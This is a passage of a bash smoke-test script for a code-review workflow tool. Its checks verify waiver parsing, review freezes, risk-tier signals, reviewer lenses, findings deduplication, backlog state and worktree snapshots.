vc "$T59" review 1 "$(wcommit "$TW" m1 a.md)" REQUEST_CHANGES >/dev/null; vc "$T59" review 1 "$(wcommit "$TW" m2 a.md)" APPROVE >/dev/null
O59="$(cd "$T59" && "$EX/status.sh" plans/v-plan.md --review-metrics)"
has '^REVIEW_METRIC: 1 2 1 1 [0-9.]* no$' "$O59" && has '^REVIEW_TOTAL: rounds=2 blocking_rounds=1 tasks=1$' "$O59" || fail "review metrics are wrong: $O59"
grep -q 'before/after' "$ADR4" && grep -q 'halt-repair-loop' "$ADR4" || fail "ADR-0004 does not state the measurement or credit the downstream feedback"
ok "review metrics: rounds, blocking rounds, attempts, minutes per round; measurement stated in ADR-0004"

# 60. Round-1 review fixes (ADR-0004): waiver scope, tier reasons to reviewers,
#     distinct-lens floor and signal lenses, full review after a tier rise,
#     directive floors, freeze cleared by fail/rewind, findings key, backlog
#     pending close, narrower content exemption, no-worktree snapshots.
# (1) A waiver covers only the REQUEST_CHANGES it listed; not while a freeze
#     has verdicts outstanding; not a negated reply; it clears only its own line's halt.
T60="$SMOKE_TMP/t60"; TW="$(cal_run "$T60" "$TWO")" || fail "init for check 60 failed"
W60="$(wcommit "$TW" w a.md)"; (cd "$T60" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null)
vc "$T60" freeze 1 "$W60" --reviewers 3 >/dev/null
has '^ASK_HUMAN:' "$(cd "$T60" && APEX_ASK_HUMAN_AFTER=1 "$CP" plans/v-plan.md review 1 "$W60" REQUEST_CHANGES rA 2>&1)" || fail "no ASK_HUMAN with APEX_ASK_HUMAN_AFTER=1"
expect_refusal "a waiver while the round has verdicts outstanding" "verdicts outstanding (1/3)" vc "$T60" waive 1 "$W60" "waive 1" "r"
vc "$T60" unfreeze 1 >/dev/null
expect_refusal "a negated waiver reply" "does not start with 'waive 1'" vc "$T60" waive 1 "$W60" "I do not want to waive 1" "r"
vc "$T60" halt "awaiting human review waiver line 3" >/dev/null
vc "$T60" waive 1 "$W60" "waive 1" "rA's finding" >/dev/null || fail "the waiver of rA was refused"
python3 -c 'import json,sys; s=json.load(open(sys.argv[1])); assert s["halted"]; w=s["operator_overrides"][-1]; assert w["waived_verdicts"]==1 and len(w["covered"])==1' "$(st "$T60" plans/v-plan.md)/checkpoint.json" \
  || fail "a waiver cleared another line's halt or did not list what it covers"
vc "$T60" resume "probe" >/dev/null
O60="$(vc "$T60" review 1 "$W60" REQUEST_CHANGES rB --role lens:money 2>&1)"; has 'after the waiver — not covered' "$O60" || fail "a REQUEST_CHANGES after the waiver did not ask again: $O60"
expect_refusal "a lens dispatched after the waiver returning REQUEST_CHANGES" "requested changes" vc "$T60" complete 1 ok
T60B="$SMOKE_TMP/t60b"; TW="$(cal_run "$T60B" "$TWO")" || fail "init for check 60 (b) failed"
W60="$(wcommit "$TW" w a.md)"; (cd "$T60B" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null)
vc "$T60B" review 1 "$W60" REQUEST_CHANGES rA >/dev/null; vc "$T60B" waive 1 "$W60" "waive 1" "r" >/dev/null
vc "$T60B" review 1 "$W60" REQUEST_CHANGES rC --role adversarial >/dev/null
expect_refusal "a late adversarial REQUEST_CHANGES after the waiver" "requested changes" vc "$T60B" complete 1 ok
vc "$T60B" waive 1 "$W60" "waive 1, as well" "r2" >/dev/null
python3 -c 'import json,sys; p=sys.argv[1]; s=json.load(open(p)); s["operator_overrides"][-1]["waived_verdicts"]=7; s["operator_overrides"][0]["waived_verdicts"]=7; json.dump(s, open(p,"w"))' "$(st "$T60B" plans/v-plan.md)/checkpoint.json"
expect_refusal "a waiver whose waived_verdicts does not match" "requested changes" vc "$T60B" complete 1 ok
python3 -c 'import json,sys; p=sys.argv[1]; s=json.load(open(p)); s["operator_overrides"][-1]["waived_verdicts"]=2; json.dump(s, open(p,"w"))' "$(st "$T60B" plans/v-plan.md)/checkpoint.json"
vc "$T60B" complete 1 ok >/dev/null 2>&1 || fail "a waiver covering both REQUEST_CHANGES did not complete"
# (2) Overridden signals reach the reviewers; an unanticipated one is flagged.
T60C="$SMOKE_TMP/t60c"; TW="$(cal_run "$T60C" '- [ ] **Phase 1.1** [docs][tier:a reason="vendored code"] a\n  - Acceptance: true\n- [ ] **Phase 1.2** [docs][tier:a reason="stripe charge client stub"] b\n  - Acceptance: true\n')" || fail "init for check 60 (c) failed"
wcommit "$TW" 'charge(1)' x.py >/dev/null
O60="$(cd "$T60C" && "$EX/risk-tier.sh" plans/v-plan.md 1)"; has '^TIER_C_UNANTICIPATED: ' "$O60" || fail "an override reason that does not mention the signal was not flagged: $O60"
has '^TIER_C_OVERRIDDEN: ' "$(cd "$T60C" && "$EX/risk-tier.sh" plans/v-plan.md 3 --no-record)" || fail "an anticipated override was not reported as TIER_C_OVERRIDDEN"
B60="$(brief "$T60C" plans/v-plan.md)"
has '^TIER_REASONS: Tier A' "$B60" && has '^  ! TIER_C_UNANTICIPATED: ' "$B60" && has "^  - tier-c content signal in diff: 'charge(' (x.py) — overridden" "$B60" || fail "the brief did not print the recorded tier reasons: $(grep -A3 TIER_REASONS <<<"$B60")"
for f in "$GR" "$PLUGIN_ROOT/commands/iterate.md" "$MARKET_ROOT/plugins/apex-dispatch/skills/dispatch-route/SKILL.md"; do grep -q 'TIER_REASONS' "$f" || fail "$(basename "$f") does not pass TIER_REASONS to reviewers"; done
printf -- '- [ ] **Phase 1.1** `[tier:a reason="x"]` a\n  - Acceptance: true\n' >"$SMOKE_TMP/t60-span.md"
python3 -c 'import json,sys; sys.path.insert(0, sys.argv[1]); import planlib; assert planlib.cmd_task(sys.argv[2], 1)["tier_override"] is None' "$EX" "$SMOKE_TMP/t60-span.md" || fail "an override inside a code span was honoured"
# (3) Distinct lenses; the lens of each Tier C signal is kept.
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  - Review: lenses=money,money,security\n' >"$SMOKE_TMP/t60-dup.md"
has 'names a lens more than once' "$(python3 "$EX/planlib.py" validate "$SMOKE_TMP/t60-dup.md" 2>&1 || true)" || fail "a repeated lens name was accepted"
T60D="$SMOKE_TMP/t60d"; TW="$(cal_run "$T60D" '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n  - Review: lenses=correctness,security,performance\n')" || fail "init for check 60 (d) failed"
mkdir -p "$TW/src/billing"; HD="$(wcommit "$TW" x src/billing/rates.txt)"
has '^SIGNAL_LENSES: money$' "$(cd "$T60D" && "$EX/risk-tier.sh" plans/v-plan.md 1)" || fail "a billing path did not name the money lens"
(cd "$T60D" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1); vc "$T60D" review 1 "$HD" APPROVE >/dev/null; vc "$T60D" review 1 "$HD" APPROVE adv --role adversarial >/dev/null; vc "$T60D" approve 1 "$HD" "approve G12 1" >/dev/null
has 'lenses=correctness,performance,security (+money required by the tier signals)' "$(vc "$T60D" complete 1 ok 2>&1)" || fail "a Tier C lens narrowing dropped the money lens of a billing signal"
# (4) A mid-attempt tier rise forces a full review.
T60E="$SMOKE_TMP/t60e"; TW="$(cal_run "$T60E" "$TWO")" || fail "init for check 60 (e) failed"
E1="$(wcommit "$TW" e1 a.md)"; (cd "$T60E" && "$EX/risk-tier.sh" plans/v-plan.md 1 --raise B --reason "shared helper" >/dev/null); vc "$T60E" review 1 "$E1" REQUEST_CHANGES >/dev/null
B60="$(brief "$T60E" plans/v-plan.md)"; has '^REVIEW_MODE: verify$' "$B60" && has "^REVIEW_SINCE: $E1$" "$B60" || fail "round 2 at the same tier was not verify since the reviewed SHA"
(cd "$T60E" && "$EX/risk-tier.sh" plans/v-plan.md 1 --raise C --reason "reviewer: it signs tokens" >/dev/null)
B60="$(brief "$T60E" plans/v-plan.md)"
has '^REVIEW_MODE: full (the tier rose to C after reviews at B' "$B60" && has "^REVIEW_SINCE: $(sed -n 's/^TASK_BASE: //p' <<<"$B60")$" "$B60" || fail "a tier rise mid-attempt did not force a full review: $(grep REVIEW_ <<<"$B60")"
# (5) Directive floors: a sensitive-tagged task keeps the adversarial pass and
#     cannot raise the cap; with apex-dispatch the route's shape is a floor.
T60F="$SMOKE_TMP/t60f"; TW="$(cal_run "$T60F" '- [ ] **Phase 1.1** [docs][money] a\n  - Acceptance: true\n  - Review: cap=9 adversarial=no\n')" || fail "init for check 60 (f) failed"
for i in 1 2 3; do vc "$T60F" review 1 "$(wcommit "$TW" "c$i" a.md)" REQUEST_CHANGES >/dev/null || fail "blocking round $i refused"; done
expect_refusal "cap=9 raising the cap on a sensitive task" "REVIEW_CAP: 3 review rounds" vc "$T60F" review 1 "$(wcommit "$TW" c4 a.md)" REQUEST_CHANGES
vc "$T60F" fail 1 x >/dev/null; HF="$(git -C "$TW" rev-parse HEAD)"; vc "$T60F" review 1 "$HF" APPROVE >/dev/null
(cd "$T60F" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null)
has 'adversarial=no (mandatory for Tier C / sensitive tasks)' "$(vc "$T60F" complete 1 ok 2>&1)" || fail "adversarial=no was applied to a money-tagged task"
T60G="$SMOKE_TMP/t60g"; TW="$(cal_run "$T60G" '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n  - Review: adversarial=no\n')" || fail "init for check 60 (g) failed"
T60GS="$(st "$T60G" plans/v-plan.md)"; mkdir -p "$T60GS/dispatch/reviews-raw"
printf '{"route_id": "r-x-L1-1", "line": 1, "router": {"review_shape": "fanout6+adversarial", "diversity": "off"}}' >"$T60GS/dispatch/active-route.json"
HG="$(wcommit "$TW" g a.md)"; (cd "$T60G" && APEX_GATE_TEST=true "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null)
expect_refusal "adversarial=no below the route's review shape" "review shape fanout6+adversarial requires it" indir "$T60G" APEX_DISPATCH_ROOT="$SMOKE_TMP/fd47" "$CP" plans/v-plan.md complete 1 ok
# (7) fail and rewind clear a freeze.
T60H="$SMOKE_TMP/t60h"; TW="$(cal_run "$T60H" "$TWO")" || fail "init for check 60 (h) failed"
H1="$(wcommit "$TW" h1 a.md)"; vc "$T60H" freeze 1 "$H1" --reviewers 2 >/dev/null; vc "$T60H" fail 1 x >/dev/null
! has '^FROZEN:' "$(brief "$T60H" plans/v-plan.md)" && vc "$T60H" review 1 "$(wcommit "$TW" h2 a.md)" APPROVE >/dev/null || fail "fail did not clear the freeze"
H3="$(git -C "$TW" rev-parse HEAD)"; vc "$T60H" freeze 1 "$H3" --reviewers 2 >/dev/null; vc "$T60H" rewind 1 >/dev/null
python3 -c 'import json,sys; assert "1" not in (json.load(open(sys.argv[1])).get("freezes") or {})' "$(st "$T60H" plans/v-plan.md)/checkpoint.json" || fail "rewind did not clear the freeze"
# (8) findings: distinct mechanisms stay separate; a non-blocking re-report never reopens.
T60I="$SMOKE_TMP/t60i"; TW="$(cal_run "$T60I" "$TWO")" || fail "init for check 60 (i) failed"; I1="$(wcommit "$TW" i a.md)"
fx2 "$T60I" "$FS" plans/v-plan.md add 1 --severity blocking --class race --at a.py:1 --sha "$I1" "lock released early" >/dev/null
has 'DUPLICATE.*mechanism added' "$(fx2 "$T60I" "$FS" plans/v-plan.md add 1 --severity blocking --class race --at a.py:1 --sha "$I1" "double write on retry")" || fail "a second mechanism of the same defect was not added to its entry"
python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); assert len(d["items"])==1 and len(d["items"][0]["mechanisms"])==2, d' "$(fx2 "$T60I" "$FS" plans/v-plan.md path 1)" || fail "a defect was counted twice"
fx2 "$T60I" "$FS" plans/v-plan.md close 1 F-001 >/dev/null
has 'DUPLICATE.*-> closed' "$(fx2 "$T60I" "$FS" plans/v-plan.md add 1 --severity non-blocking --class race --at a.py:1 --sha "$I1" "lock released early")" || fail "a non-blocking re-report reopened a closed blocking finding"
# (9) backlog: done from a task is pending until that task completes; fail reopens it.
T60J="$SMOKE_TMP/t60j"; TW="$(cal_run "$T60J" "$TWO")" || fail "init for check 60 (j) failed"
(cd "$T60J" && "$EX/backlog.sh" plans/v-plan.md add 1 "harden x" >/dev/null); J1="$(wcommit "$TW" j a.md)"
expect_refusal "done without a closing SHA" "needs --line LINE --sha" indir "$T60J" "$EX/backlog.sh" plans/v-plan.md done B-001
(cd "$T60J" && "$EX/backlog.sh" plans/v-plan.md done B-001 --line 1 --sha "$J1" >/dev/null)
has 'pending close: line 1' "$(cd "$T60J" && "$EX/backlog.sh" plans/v-plan.md list)" && [ "$(cd "$T60J" && "$EX/backlog.sh" plans/v-plan.md count)" = 1 ] || fail "a task's done was not pending"
vc "$T60J" fail 1 x >/dev/null
! has 'pending close' "$(cd "$T60J" && "$EX/backlog.sh" plans/v-plan.md list)" || fail "fail did not reopen a pending close"
(cd "$T60J" && "$EX/backlog.sh" plans/v-plan.md done B-001 --line 1 --sha "$J1" >/dev/null && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null \
  && "$CP" plans/v-plan.md review 1 "$J1" APPROVE >/dev/null && "$CP" plans/v-plan.md complete 1 ok >/dev/null 2>&1) || fail "complete failed in check 60 (j)"
[ "$(cd "$T60J" && "$EX/backlog.sh" plans/v-plan.md count)" = 0 ] && grep -q "B-001 .*(done .* at ${J1:0:12}, line 1)" "$T60J/.claude/apex-scope-loop/BACKLOG.md" || fail "complete did not confirm the pending close"
# (10) Markdown outside docs/ and smoke-named source files are scanned.
has '^TIER: B' "$(rtc '[docs]' README.md 'stripe keys live here')" || fail "a Markdown-only content term was exempted or raised to C"
has '^TIER: C' "$(rtc '[docs]' src/smoke_helper.py 'import stripe')" || fail "content in src/smoke_helper.py was exempted"
# (11) A run without a worktree keeps snapshots outside the work tree.
T60K="$SMOKE_TMP/t60k"; mkdir -p "$T60K/plans"; git init -q -b main "$T60K"; printf '.dev-plan-state/\n' >"$T60K/.gitignore"
printf -- "$TWO" >"$T60K/plans/v-plan.md"; git -C "$T60K" add -A; git -C "$T60K" commit -qm k
( cd "$T60K" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/v-plan.md >/dev/null 2>&1 ) || fail "no-worktree init failed in check 60"
SPK="$(cd "$T60K" && "$EX/snapshot.sh" plans/v-plan.md | sed -n 's/^REVIEW_SNAPSHOT: //p')"
case "$SPK" in "$T60K/.git/apex-scope-loop-snapshots/"*) ;; *) fail "a no-worktree snapshot is not under the common git dir: $SPK" ;; esac
has 'GATE: SKIPPED\|GATE: PASS' "$(cd "$T60K" && "$EX/green-gate.sh" plans/v-plan.md check 2>&1)" || fail "a no-worktree snapshot dirtied the gate"
ok "round-1 fixes: waiver covers only its listed verdicts (freeze, negation, own-line halt, late verdicts); TIER_REASONS and unanticipated overrides; distinct and signal lenses; full review after a tier rise; directive floors; freeze cleared; findings key; backlog pending close; narrower exemption; no-worktree snapshots"

# 61. Round-2 review fixes (ADR-0004): the review mode is enforced, every Tier C
#     content term is checked against an override, plain waiver replies, ASK_HUMAN
#     pending during a freeze, Markdown-only terms give Tier B, done without state.
# (1) A tier rise after round 1: the brief (taken before risk-tier) still says
#     verify; review-mode and freeze know better; a verify-only Tier C fan-out
#     cannot complete; a full Tier C round can.
T61="$SMOKE_TMP/t61"; TW="$(cal_run "$T61" "$TWO")" || fail "init for check 61 failed"
R1="$(wcommit "$TW" r1 a.md)"; (cd "$T61" && "$EX/risk-tier.sh" plans/v-plan.md 1 --raise B --reason "shared helper" >/dev/null); vc "$T61" review 1 "$R1" REQUEST_CHANGES >/dev/null
mkdir -p "$TW/src/auth"; R2="$(wcommit "$TW" fix src/auth/token.py)"
has '^REVIEW_MODE: verify$' "$(brief "$T61" plans/v-plan.md)" || fail "the brief before risk-tier did not still say verify (fixture)"
(cd "$T61" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null)
has '^REVIEW_MODE: full (the tier rose to C' "$(vc "$T61" review-mode 1)" || fail "review-mode after risk-tier did not say full"
expect_refusal "freeze --mode verify after a tier rise" "the tier rose to C" vc "$T61" freeze 1 "$R2" --reviewers 2 --mode verify
vc "$T61" review 1 "$R2" APPROVE --mode verify >/dev/null; vc "$T61" review 1 "$R2" APPROVE adv --role adversarial --mode verify >/dev/null
vc "$T61" approve 1 "$R2" "approve G12 1" >/dev/null
expect_refusal "a verify-only Tier C fan-out" "no full review at Tier C" vc "$T61" complete 1 ok
vc "$T61" freeze 1 "$R2" --reviewers 1 --mode full >/dev/null || fail "freeze --mode full refused"
vc "$T61" review 1 "$R2" APPROVE adv2 --role adversarial >/dev/null
python3 -c 'import json,sys; x=json.load(open(sys.argv[1]))["reviews"]["1"]["records"][-1]; assert x["mode"]=="full" and x["tier"]=="C", x' "$(st "$T61" plans/v-plan.md)/checkpoint.json" || fail "a frozen full round did not record mode full at Tier C"
vc "$T61" complete 1 ok >/dev/null 2>&1 || fail "a full Tier C round with an adversarial pass did not complete"
# (2) Every distinct Tier C content term is checked against the override reason.
O61="$(rtc '[docs][tier:b reason="price display formatting"]' a_view.py 'label = price' b_util.py 'h = bcrypt.hash(p)')"
has "^TIER_C_OVERRIDDEN: tier-c content signal in diff: 'price' (a_view.py)" "$O61" && has "^TIER_C_UNANTICIPATED: tier-c content signal in diff: 'bcrypt' (b_util.py)" "$O61" \
  && has '^SIGNAL_LENSES: .*security' "$O61" && has '^TIER: B' "$O61" || fail "not every Tier C content term was checked against the override: $O61"
# (3) Waiver replies: plain wording with other words is accepted, refusals are named.
T61B="$SMOKE_TMP/t61b"; TW="$(cal_run "$T61B" "$TWO")" || fail "init for check 61 (b) failed"; RB="$(wcommit "$TW" b a.md)"
vc "$T61B" review 1 "$RB" REQUEST_CHANGES >/dev/null
# Round 3: the reply must START with "waive <LINE>" (after quotes/backticks); nothing else is parsed.
for ok in "waive 1" "Waive 1 — not worth another round" '`waive 1`' "waive 1, no further changes needed"; do
  vc "$T61B" waive 1 "$RB" "$ok" "r" >/dev/null || fail "the plain waiver reply '$ok' was refused"
done
for bad in "I don't think we should waive 1" "I do not think you should waive 1 yet" "Do NOT under any circumstances waive 1" \
           "Please hold off, I won't be able to waive 1 until Monday" "don’t waive 1" "No worries, waive 1" "Yes waive 1" "waive 10"; do
  expect_refusal "the waiver reply '$bad'" "ask the human to reply plainly \`waive 1\` (optionally followed by a remark)" vc "$T61B" waive 1 "$RB" "$bad" "r"
done
# (4) ASK_HUMAN during an outstanding freeze says to finish the round first.
R4="$(wcommit "$TW" b2 a.md)"; vc "$T61B" freeze 1 "$R4" --reviewers 2 >/dev/null
O61="$(cd "$T61B" && APEX_ASK_HUMAN_AFTER=1 "$CP" plans/v-plan.md review 1 "$R4" REQUEST_CHANGES 2>&1)"
has "^ASK_HUMAN: pending — record the rest of this round's verdicts first (1/2 in)" "$O61" && ! has 'halt and ask' "$O61" || fail "ASK_HUMAN asked for a halt during an outstanding freeze: $O61"
# (6) Markdown with a code signal beside it is still Tier C.
has '^TIER: C' "$(rtc '[docs]' README.md 'stripe' src/x.py 'import stripe')" || fail "a content term in code beside Markdown was not Tier C"
# (7) done --line --sha without run state is refused.
T61N="$SMOKE_TMP/t61n"; mkdir -p "$T61N/plans"; git init -q -b main "$T61N"; printf -- "$TWO" >"$T61N/plans/v-plan.md"; git -C "$T61N" add -A; git -C "$T61N" commit -qm n
(cd "$T61N" && "$EX/backlog.sh" plans/v-plan.md add 1 "x" >/dev/null) || fail "backlog add without run state failed"
expect_refusal "done --line --sha without run state" "no run state" indir "$T61N" "$EX/backlog.sh" plans/v-plan.md done B-001 --line 1 --sha "$(git -C "$T61N" rev-parse HEAD)"
# Round 3: a frozen round that completes with an APPROVE still asks, when one of its verdicts requested changes.
R5="$(wcommit "$TW" b3 a.md)"; vc "$T61B" freeze 1 "$R5" --reviewers 2 >/dev/null
vc "$T61B" review 1 "$R5" REQUEST_CHANGES >/dev/null
O61="$(vc "$T61B" review 1 "$R5" APPROVE r2 --role lens:money 2>&1)"
has '^FREEZE: lifted' "$O61" && has '^ASK_HUMAN: line 1 has REQUEST_CHANGES in' "$O61" || fail "a completed frozen round with a REQUEST_CHANGES did not ask the human: $O61"
# Round 3: Markdown that ships as a plugin surface keeps Tier C; other Markdown gets Tier B.
has '^TIER: C' "$(rtc '[docs]' plugins/x/agents/a.md 'Store the stripe secret')" || fail "a Tier C term in a shipped agent prompt was downgraded"
has '^TIER: B' "$(rtc '[docs]' README.md 'stripe')" || fail "a top-level README term was not Tier B"
ok "round-2 fixes: review mode enforced (brief predates the rise; review-mode, freeze and complete enforce full); every content term vs the override; plain waiver replies; ASK_HUMAN pending; Markdown-only Tier B; done needs run state"

echo ""
echo "smoke passed: 61/61 checks"
